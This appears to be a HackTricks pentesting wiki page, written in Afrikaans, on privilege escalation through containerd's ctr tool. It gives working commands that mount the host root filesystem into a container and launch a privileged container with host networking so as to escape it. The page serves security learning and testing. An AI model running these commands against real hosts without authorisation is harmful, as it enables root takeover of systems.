# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

Gaan na die volgende skakel om te leer **wat is containerd** en `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

as jy vind dat 'n gasheer die `ctr` opdrag bevat:
```bash
which ctr
/usr/bin/ctr
```
U kan die beelde lys:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
En dan **hardloop een van daardie beelde deur die gasheer se wortelgids na dit te monteer**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Voer 'n bevoorregte houer uit en ontsnap daarvan.\
Jy kan 'n bevoorregte houer uitvoer as:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Dan kan jy sommige van die tegnieke wat op die volgende bladsy genoem word gebruik om **daarvan te ontsnap deur bevoorregte vermoëns te misbruik**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
